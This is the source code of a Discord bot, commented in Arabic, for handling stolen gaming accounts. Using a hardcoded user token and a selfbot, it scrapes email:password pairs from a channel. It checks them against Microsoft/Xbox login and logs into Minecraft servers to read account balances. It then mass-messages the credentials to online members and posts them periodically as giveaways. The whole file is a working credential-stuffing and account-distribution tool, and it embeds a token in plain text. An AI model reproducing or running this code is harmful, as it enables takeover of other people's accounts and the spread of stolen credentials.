require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, Partials } = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');
const xboxauth = require('@xboxreplay/xboxlive-auth');
const mineflayer = require('mineflayer');
const fs = require('fs');
const path = require('path');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ],
    partials: [Partials.Channel]
});

// --- ⚙️ الإعدادات الثابتة ---
const ALLOWED_USERS = ["1462575612085538828", "1130516001495208046", "1130516001495208046"];
const USER_TOKEN = "MTQ0ODk4NDU1NTY1MzQzMTM1OQ.GTt5MJ.C7XwseDVj98cyqw7XqR_HJMaq2nIL06OCDyIr8";
const SCRAPE_CHANNEL_ID = "1537294498777014323";

const ACCOUNTS_FILE = path.join(__dirname, 'combos.txt');
const SERVERS_FILE = path.join(__dirname, 'servers.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');
const PREFIX = '$';

let dropTimer = null;

// --- إدارة الملفات ---
function loadTXT(file) {
    if (!fs.existsSync(file)) return [];
    try {
        const d = fs.readFileSync(file, 'utf8');
        return d.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    } catch { return []; }
}
function saveTXT(file, data) { fs.writeFileSync(file, data.join('\n'), 'utf8'); }
function loadJSON(file) {
    if (!fs.existsSync(file)) return [];
    try { const d = fs.readFileSync(file, 'utf8'); return d ? JSON.parse(d) : []; } catch { return []; }
}
function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 4)); }
function loadConfig() {
    if (!fs.existsSync(CONFIG_FILE)) return { dropChannel: null, interval: 300000, totalToScrape: 100 };
    try { return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch { return { dropChannel: null, interval: 300000, totalToScrape: 100 }; }
}

// خلط المصفوفة
function shuffleArray(arr) {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
}

// دالة الإرسال السريع (توزيع دفعات متوازية)
async function fastSend(members, embed) {
    const batchSize = 10; // إرسال 10 رسائل في نفس الوقت
    let success = 0;
    let fail = 0;

    for (let i = 0; i < members.length; i += batchSize) {
        const batch = members.slice(i, i + batchSize);
        const results = await Promise.allSettled(batch.map(m => m.send({ embeds: [embed] })));
        
        results.forEach(res => {
            if (res.status === 'fulfilled') success++;
            else fail++;
        });
        
        // تأخير بسيط جداً بين الدفعات لتجنب Rate Limit القاسي
        await new Promise(r => setTimeout(r, 100));
    }
    return { success, fail };
}

// --- وظائف الفحص ---
async function checkAccountLegacy(email, password) {
    try {
        await xboxauth.authenticate(email.trim(), password.trim());
        return true;
    } catch (err) {
        const msg = (err.message || "").toLowerCase();
        if (msg.includes("userinteraction") || msg.includes("security") || msg.includes("interrupt")) return true;
        return false;
    }
}

async function checkServer(email, password, host) {
    return new Promise((resolve) => {
        const bot = mineflayer.createBot({
            host: host, auth: 'microsoft', username: email.trim(), password: password.trim(),
            version: false, hideErrors: true, connectTimeout: 10000
        });
        let balance = "0";
        let timeout = setTimeout(() => { bot.end(); resolve({ success: false }); }, 15000);
        bot.on('login', () => {
            if (host.includes('donutsmp')) { setTimeout(() => { bot.chat('/bal'); }, 3000); }
            else { clearTimeout(timeout); bot.end(); resolve({ success: true }); }
        });
        bot.on('message', (jsonMsg) => {
            const msg = jsonMsg.toString();
            if (msg.toLowerCase().includes('balance') || msg.includes('$')) {
                let match = msg.match(/\$?\d+(,\d+)?(\.\d+)?/);
                balance = match ? match[0] : "0";
                clearTimeout(timeout); bot.end(); resolve({ success: true, balance });
            }
        });
        bot.on('error', () => { clearTimeout(timeout); resolve({ success: false }); });
        bot.on('kicked', () => { clearTimeout(timeout); resolve({ success: false }); });
    });
}

// --- معالج الرسائل ---
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    if (!ALLOWED_USERS.includes(message.author.id)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

    // 1. المساعدة $help
    if (cmd === 'help') {
        const embed = new EmbedBuilder()
            .setColor('#3498db').setTitle('🛠️ لوحة تحكم Sopra المحدثة')
            .addFields(
                { name: '🔍 الفحص', value: '`$فحص`: 5 حسابات/ثانية.\n`$فحص_سيرفرات`: فحص الرصيد والسيرفرات.' },
                { name: '📥 السحب والستوك', value: '`$start`: سحب من القناة.\n`$stock`: عرض الكمية.\n`$رسائل [عدد]`: تحديد كمية السحب.' },
                { name: '📩 الإرسال', value: '`$sent @user [عدد]`: إرسال حسابات لشخص.\n`$sent all [عدد]`: توزيع عشوائي سريع جداً.' },
                { name: '🎁 التوزيع (Drop)', value: '`$drop`: بدء.\n`$stopdrop`: إيقاف.\n`$روم`: تحديد قناة.\n`$وقت`: تحديد زمن الدروب.' },
                { name: '🗑️ الحذف', value: '`$reset`: مسح كل البيانات.' }
            );
        message.channel.send({ embeds: [embed] });
    }

    // 2. السحب $start
    if (cmd === 'start') {
        const config = loadConfig();
        const totalToScrape = config.totalToScrape || 100;
        const self = new SelfClient({ checkUpdate: false });
        try {
            await self.login(USER_TOKEN);
            const channel = await self.channels.fetch(SCRAPE_CHANNEL_ID);
            const statusMsg = await message.reply(`⏳ جاري السحب من القناة بنظام الدفعات (الهدف: **${totalToScrape}** رسالة)...`);
            let lastId = null;
            let newCount = 0;
            let messagesFetched = 0;
            let accounts = loadTXT(ACCOUNTS_FILE);
            while (messagesFetched < totalToScrape) {
                const fetchLimit = Math.min(10, totalToScrape - messagesFetched);
                let fetchOptions = { limit: fetchLimit };
                if (lastId) fetchOptions.before = lastId;
                const messages = await channel.messages.fetch(fetchOptions);
                if (messages.size === 0) break;
                for (const msg of messages.values()) {
                    let content = msg.content || "";
                    if (msg.embeds.length > 0) {
                        const embed = msg.embeds[0];
                        content += "\n" + (embed.description || "");
                        if (embed.fields?.length) { content += "\n" + embed.fields.map(f => `${f.name}\n${f.value}`).join("\n"); }
                    }
                    content = content.replace(/\|\|/g, "");
                    const match = content.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}):([^\s]+)/);
                    if (match) {
                        const entry = `${match[1].trim().toLowerCase()}:${match[2].trim()}`;
                        if (!accounts.includes(entry)) { accounts.push(entry); newCount++; }
                    }
                }
                messagesFetched += messages.size;
                lastId = messages.last().id;
                if (messagesFetched % 20 === 0 || messagesFetched >= totalToScrape) {
                    await statusMsg.edit(`⏳ جاري السحب... تم فحص **${messagesFetched}/${totalToScrape}** رسالة. أُضيف حتى الآن: **${newCount}** حسابات.`);
                }
                await new Promise(resolve => setTimeout(resolve, 0));
            }
            saveTXT(ACCOUNTS_FILE, accounts);
            statusMsg.edit(`✅ تم السحب بنجاح! تم فحص **${messagesFetched}** رسالة وأضيفت **${newCount}** حسابات جديدة.`);
        } catch (e) { message.reply(`❌ خطأ: ${e.message}`); } finally { self.destroy(); }
    }

    // 3. الفحص $فحص
    if (cmd === 'فحص') {
        let accounts = loadTXT(ACCOUNTS_FILE);
        if (accounts.length === 0) return message.reply("❌ الستوك فارغ.");
        const status = await message.reply(`⏳ فحص **${accounts.length}** حساب...`);
        let valid = [];
        for (let i = 0; i < accounts.length; i++) {
            const [email, pass] = accounts[i].split(':');
            const ok = await checkAccountLegacy(email, pass);
            if (ok) valid.push(accounts[i]);
            if (i % 10 === 0 || i === accounts.length - 1) {
                await status.edit(`⏳ جاري الفحص: (${i + 1}/${accounts.length}) | ✅ شغال: ${valid.length}`);
            }
        }
        return;
    }

    // 4. فحص السيرفرات $فحص_سيرفرات
    if (cmd === 'فحص_سيرفرات') {
        let accounts = loadTXT(ACCOUNTS_FILE);
        const status = await message.reply(`🔍 فحص السيرفرات لـ **${accounts.length}** حساب...`);
        let serverStock = [];
        for (let i = 0; i < accounts.length; i++) {
            const [email, pass] = accounts[i].split(':');
            await status.edit(`🔍 فحص السيرفرات: حساب (${i + 1}/${accounts.length})\n📧 \`${email}\``);
            const [dnt, hyp, cub] = await Promise.all([
                checkServer(email, pass, 'donutsmp.net'),
                checkServer(email, pass, 'hypixel.net'),
                checkServer(email, pass, 'CubeCraft.net')
            ]);
            let res = { donut: dnt.success, hypixel: hyp.success, cubecraft: cub.success, balance: dnt.balance || "0" };
            if (res.donut || res.hypixel || res.cubecraft) {
                serverStock.push({ account: accounts[i], ...res });
                saveJSON(SERVERS_FILE, serverStock);
            }
        }
        status.edit(`✅ انتهى فحص السيرفرات! الحسابات: **${serverStock.length}**`);
    }

    // 5. الإرسال $sent
    if (cmd === 'sent') {
        // --- $sent all [عدد] ---
        if (args[0]?.toLowerCase() === 'all') {
            const poolSize = parseInt(args[1]) || 1;
            const guild = message.guild;
            if (!guild) return message.reply("❌ هذا الأمر يعمل داخل السيرفر فقط.");

            await guild.members.fetch();
            const onlineMembers = Array.from(guild.members.cache.filter(m =>
                !m.user.bot && m.presence?.status && m.presence.status !== 'offline'
            ).values());

            if (onlineMembers.length === 0) return message.reply("❌ لا يوجد أعضاء أونلاين.");

            let accounts = loadTXT(ACCOUNTS_FILE);
            if (accounts.length === 0) return message.reply("❌ الستوك فارغ.");

            const statusMsg = await message.reply("تم جاري الانتهاء...");

            const shuffledPool = shuffleArray(accounts).slice(0, Math.min(poolSize, accounts.length));

            // تجهيز الإرسال الجماعي
            let successCount = 0;
            let failCount = 0;
            const batchSize = 15; // زيادة سرعة الدفعات

            for (let i = 0; i < onlineMembers.length; i += batchSize) {
                const batch = onlineMembers.slice(i, i + batchSize);
                const promises = batch.map(member => {
                    const randomAcc = shuffledPool[Math.floor(Math.random() * shuffledPool.length)];
                    const [e, p] = randomAcc.split(':');
                    const embed = new EmbedBuilder().setColor('#f1c40f').setTitle('🎮 Account')
                        .setDescription(`تم إرسالها إليك من **${message.guild.name}**`)
                        .addFields({ name: 'Email', value: `\`${e}\``, inline: true }, { name: 'Pass', value: `\`${p}\``, inline: true }, { name: 'Info', value: 'Normal', inline: true });
                    return member.send({ embeds: [embed] });
                });

                const results = await Promise.allSettled(promises);
                results.forEach(res => { if (res.status === 'fulfilled') successCount++; else failCount++; });
                await new Promise(r => setTimeout(r, 50)); // تأخير طفيف جداً
            }

            await statusMsg.edit(`تم الانهاء ✅\n👥 المستلمون: **${onlineMembers.length}** | ✅ وصلت: **${successCount}** | ❌ فشل: **${failCount}**`);
            return;
        }

        // --- $sent @user [عدد/نوع] ---
        const target = message.mentions.users.first();
        if (!target) return message.reply("❌ منشن الشخص أو استخدم `all`.");

        const statusMsg = await message.reply("تم جاري الانتهاء...");

        const secondArg = args[1]?.toLowerCase();
        let accounts = loadTXT(ACCOUNTS_FILE);
        let serverStock = loadJSON(SERVERS_FILE);

        const serverTypes = ['donut', 'hypixel', 'cubecraft'];
        if (serverTypes.includes(secondArg)) {
            const acc = serverStock.find(a => a[secondArg]);
            if (!acc) { await statusMsg.edit(`❌ لا يوجد حساب ${secondArg}.`); return; }
            const [e, p] = acc.account.split(':');
            const embed = new EmbedBuilder().setColor('#f1c40f').setTitle('🎮 Account')
                .addFields({ name: 'Email', value: `\`${e}\`` }, { name: 'Pass', value: `\`${p}\`` }, { name: 'Info', value: `Type: ${secondArg} | Bal: ${acc.balance}` });
            
            try { await target.send({ embeds: [embed] }); await statusMsg.edit("تم الانهاء ✅"); } 
            catch { await statusMsg.edit("❌ الخاص مغلق."); }
            return;
        }

        const count = parseInt(secondArg) || 1;
        if (accounts.length === 0) { await statusMsg.edit("❌ الستوك فارغ."); return; }

        const shuffled = shuffleArray(accounts);
        const selected = shuffled.slice(0, Math.min(count, accounts.length));

        let sentOk = 0;
        for (const acc of selected) {
            const [e, p] = acc.split(':');
            const embed = new EmbedBuilder().setColor('#f1c40f').setTitle('🎮 Account')
                .addFields({ name: 'Email', value: `\`${e}\`` }, { name: 'Pass', value: `\`${p}\`` }, { name: 'Info', value: 'Normal' });
            try { await target.send({ embeds: [embed] }); sentOk++; } catch { break; }
        }

        if (sentOk > 0) await statusMsg.edit(`تم الانهاء ✅ (تم إرسال ${sentOk} حسابات)`);
        else await statusMsg.edit("❌ فشل الإرسال (الخاص مغلق).");
    }

    // 6. التوزيع (Drop Commands)
    if (cmd === 'drop') {
        const config = loadConfig();
        if (!config.dropChannel) return message.reply("❌ حدد روم الدروب أولاً.");
        if (dropTimer) clearInterval(dropTimer);
        message.reply("🚀 بدأ التوزيع التلقائي...");
        dropTimer = setInterval(async () => {
            let accounts = loadTXT(ACCOUNTS_FILE);
            const ch = await client.channels.fetch(config.dropChannel).catch(() => null);
            if (ch && accounts.length > 0) {
                const shuffled = shuffleArray(accounts);
                const [e, p] = shuffled[0].split(':');
                ch.send({ embeds: [new EmbedBuilder().setColor('#f1c40f').setTitle('🎁 حساب مجاني!').addFields({ name: 'Email', value: `\`${e}\`` }, { name: 'Pass', value: `\`${p}\`` })] });
            }
        }, config.interval);
    }
    if (cmd === 'stopdrop') { if (dropTimer) { clearInterval(dropTimer); dropTimer = null; message.reply("🛑 توقف الدروب."); } }
    if (cmd === 'روم') {
        const ch = message.mentions.channels.first();
        if (ch) { let config = loadConfig(); config.dropChannel = ch.id; saveJSON(CONFIG_FILE, config); message.reply(`✅ تم تحديد الروم: ${ch}`); }
    }
    if (cmd === 'وقت') {
        let config = loadConfig(); let val = parseInt(args[0]);
        config.interval = args[0].includes('m') ? val * 60000 : val * 1000;
        saveJSON(CONFIG_FILE, config); message.reply(`✅ تم ضبط الوقت إلى ${args[0]}.`);
    }

    // 7. أوامر المسح والستوك
    if (cmd === 'stock') message.reply(`📦 العام: **${loadTXT(ACCOUNTS_FILE).length}** | السيرفرات: **${loadJSON(SERVERS_FILE).length}**`);
    if (cmd === 'reset') { saveTXT(ACCOUNTS_FILE, []); saveJSON(SERVERS_FILE, []); message.reply("🔄 تم تصفير كافة البيانات نهائياً."); }
    if (cmd === 'رسائل') {
        let config = loadConfig();
        config.totalToScrape = parseInt(args[0]);
        saveJSON(CONFIG_FILE, config);
        message.reply(`✅ تم تحديد كمية السحب: ${args[0]}`);
    }
});

client.once('ready', () => console.log(`✅ ${client.user.tag} جاهز للعمل!`));
client.login(process.env.DISCORD_TOKEN);
